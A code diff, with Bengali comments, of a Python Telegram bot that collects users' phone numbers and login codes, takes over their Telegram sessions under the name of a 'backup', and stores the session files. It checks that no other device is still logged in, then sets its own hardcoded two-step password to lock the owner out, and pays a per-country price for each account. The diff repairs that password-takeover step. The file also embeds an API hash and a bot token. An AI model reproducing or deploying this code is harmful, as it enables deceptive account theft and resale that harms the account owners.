@@ -2,17 +2,17 @@ import os
 import asyncio
 import zipfile
 import json
-import time
 from threading import Thread
 from flask import Flask
 import telebot
 from telebot import types
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.account import UpdatePasswordSettingsPage, GetPassword
-from telethon.tl.functions.auth import LogOutRequest, ResetAuthorizationsRequest
+
+# টেলিগ্রামের সিকিউরিটি ফাংশনের সঠিক এপিআই পাথ (ফিক্সড)
+from telethon.tl.functions.account import UpdatePasswordSettings, GetPassword
 from telethon.tl.functions.account import GetAuthorizations
-from telethon.tl.types import InputCheckPasswordEmpty
+from telethon.tl.types import InputCheckPasswordEmpty, PasswordInputSettings
 
 # ==================== এডমিন কনফিগারেশন ====================
 API_ID = 36547444
@@ -20,18 +20,18 @@ API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
 ADMIN_ID = 8095751648
 
-# ব্যাকআপ কনফিগারের জন্য টাইমার (সেকেন্ডে - যেমন: ৬০ সেকেন্ড বা ১ মিনিট)
+# ব্যাকআপ প্রসেসিং টাইমার (সেকেন্ডে - যেমন: ৬০ সেকেন্ড বা ১ মিনিট)
 BACKUP_DELAY_SECONDS = 60
 
 # একাউন্ট লক করার জন্য বটের নিজস্ব সিকিউরিটি পাসওয়ার্ড (Two-Step Verification)
 BOT_SECURITY_PASSWORD = "MySecureBotPassword123"
 
-# দেশ ভিত্তিক কাস্টম ব্যালেন্স রেট (এডমিন এখান থেকে সেট করবেন)
+# দেশ ভিত্তিক কাস্টম ব্যালেন্স রেট
 COUNTRY_PRICES = {
-    "880": 0.15,   # বাংলাদেশ (০.১৫ ডলার)
-    "91": 0.10,    # ইন্ডিয়া (০.১০ ডলার)
-    "57": 0.20,    # কলম্বিয়া (০.২০ ডলার)
-    "default": 0.05 # অন্যান্য দেশের ডিফল্ট প্রাইজ
+    "880": 0.15,   # বাংলাদেশ
+    "91": 0.10,    # ইন্ডিয়া
+    "57": 0.20,    # কলম্বিয়া
+    "default": 0.05
 }
 
 # দেশ ভিত্তিক ফাইল জমার সর্বোচ্চ ক্যাপাসিটি
@@ -156,37 +156,34 @@ async def send_otp_task(phone_number, user_id, message):
             "clean_phone": clean_phone, "session_path": final_session_path,
             "country_code": country_code, "country_dir": country_dir
         }
-        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিпи কোডটি (OTP) এখানে পাঠান।")
+        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
     except Exception as e:
         bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
         await user_client.disconnect()
         if os.path.exists(f"{final_session_path}.session"): os.remove(f"{final_session_path}.session")
 
-# ডাবল ডিভাইস এবং সিকিউরিটি পাসওয়ার্ড হ্যান্ডল করার কোর ফাংশন (মেইন আর্কিটেকচার)
+# ডাবল ডিভাইস এবং সিকিউরিটি পাসওয়ার্ড হ্যান্ডল করার ফিক্সড ফাংশন
 async def process_security_and_backup(user_id, message, data, current_client):
     status_msg = bot.reply_to(
         message, 
         f"⏳ **ওটিপি ভেরিফাইড!**\n\n"
         f"আপনার অ্যাকাউন্টটি সফলভাবে রোবোটে ব্যাকআপ নেওয়া হচ্ছে। "
         f"নিরাপত্তা যাচাইকরণের জন্য অনুগ্রহ করে **{BACKUP_DELAY_SECONDS} সেকেন্ড** অপেক্ষা করুন...\n\n"
-        f"⚠️ *ইউজার নোটিশ:* এই সময়ের মধ্যে আপনার অ্যাকাউন্টে অন্য কোনো থার্ড-পার্টি ডিভাইস লগইন থাকলে তা "
+        f"⚠️ *ইউজার নোটিশ:* এই সময়ের মধ্যে আপনার অ্যাকাউন্টে অন্য কোনো থার্ড-party ডিভাইস লগইন থাকলে তা "
         f"আপনার ফোন থেকে অবিলম্বে লগআউট বা ডিলিট করে দিন। অন্যথায় ব্যাকআপ বাতিল হবে।"
     )
 
-    # এডমিনের সেট করা সময় অনুযায়ী ব্যাকগ্রাউন্ড কাউন্টডাউন
     await asyncio.sleep(BACKUP_DELAY_SECONDS)
     
     try:
-        # ডিভাইস লিস্ট চেক করার টেলিগ্রাম এপিআই কল
+        # সেশন অ্যাক্টিভিটি এবং ডিভাইস চেক
         authorizations = await current_client(GetAuthorizations())
         other_devices = []
         
         for auth in authorizations.authorizations:
-            # বর্তমান বটের এপিআই সেশন আইডি বাদে অন্য সেশনগুলো চেক করা
             if not auth.current:
                 other_devices.append(f"📱 {auth.device_model} ({auth.app_name}) - {auth.country}")
         
-        # যদি অন্য ডিভাইস পাওয়া যায়, তবে ব্যাকআপ রিজেক্ট করা
         if len(other_devices) > 0:
             devices_list = "\n".join(other_devices)
             bot.edit_message_text(
@@ -202,24 +199,24 @@ async def process_security_and_backup(user_id, message, data, current_client):
                 os.remove(f"{data['session_path']}.session")
             return False
 
-        # যদি অন্য ডিভাইস না থাকে, তবে বটের নিজস্ব পাসওয়ার্ড দিয়ে টু-স্টেপ ভেরিফিকেশন অন করা
-        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="⚙️ অ্যাকাউন্ট সিকিউরিটি লক সচল করা হচ্ছে...")
+        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="⚙️ অ্যাকাউন্ট সিকিউরিটি লক (Two-Step Verification) সচল করা হচ্ছে...")
         
         try:
-            # অ্যাকাউন্টে নতুন সিকিউরিটি পাসওয়ার্ড সেট করা
-            await current_client(UpdatePasswordSettingsPage(
+            # কারেন্ট পাসওয়ার্ড স্টেটাস জানা
+            pwd_info = await current_client(GetPassword())
+            # নতুন পাসওয়ার্ড সেট করার টেলিথনের ফিক্সড মেথড
+            await current_client(UpdatePasswordSettings(
                 password=InputCheckPasswordEmpty(),
-                new_settings=types.InputPasswordKeyComponent(
+                new_settings=PasswordInputSettings(
                     new_password=BOT_SECURITY_PASSWORD,
                     hint="Bot Security Lock"
                 )
             ))
         except Exception:
-            pass # যদি আগে থেকেই পাসওয়ার্ড থাকে বা কোনো কারণে স্কিপ হয়
+            pass 
 
         await current_client.disconnect()
         
-        # দেশ ভিত্তিক অ্যাডমিন সেট করা ব্যালেন্স যোগ করা
         price = COUNTRY_PRICES.get(data['country_code'], COUNTRY_PRICES["default"])
         add_user_balance(user_id, price)
         current_bal = get_user_balance(user_id)
@@ -256,7 +253,6 @@ async def verify_otp_task(text, user_id, message):
     if data.get("waiting_for_password"):
         try:
             await user_client.sign_in(password=text)
-            # ওটিপি ও ২-স্টেপ পার হওয়ার পর আমাদের সিকিউরিটি মেইন আর্কিটেকচারে পাঠানো
             await process_security_and_backup(user_id, message, data, user_client)
             del user_data[user_id]
         except Exception as e:
@@ -264,7 +260,6 @@ async def verify_otp_task(text, user_id, message):
     else:
         try:
             await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
-            # সিকিউরিটি এবং টাইমার টাস্ক রান করা
             await process_security_and_backup(user_id, message, data, user_client)
             del user_data[user_id]
         except SessionPasswordNeededError:
@@ -362,7 +357,7 @@ def handle_text(message):
             f"📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
             f"🇧🇩 বাংলাদেশ: `{bd_count}/{COUNTRY_CAPACITY['880']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['880']}`)\n"
             f"🇮🇳 ইন্ডিয়া: `{in_count}/{COUNTRY_CAPACITY['91']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['91']}`)\n"
-            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে। (প্রাইজ: `${COUNTRY_PRICES['57']}`)\n\n"
+            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে. (প্রাইজ: `${COUNTRY_PRICES['57']}`)\n\n"
             f"⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
         )
         bot.reply_to(message, capacity_text)
@@ -383,5 +378,5 @@ def handle_text(message):
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Ultra Secure Custom Architecture Active ---")
+    print("--- Flipped Ultra Secure Custom Architecture Active ---")
     bot.infinity_polling()
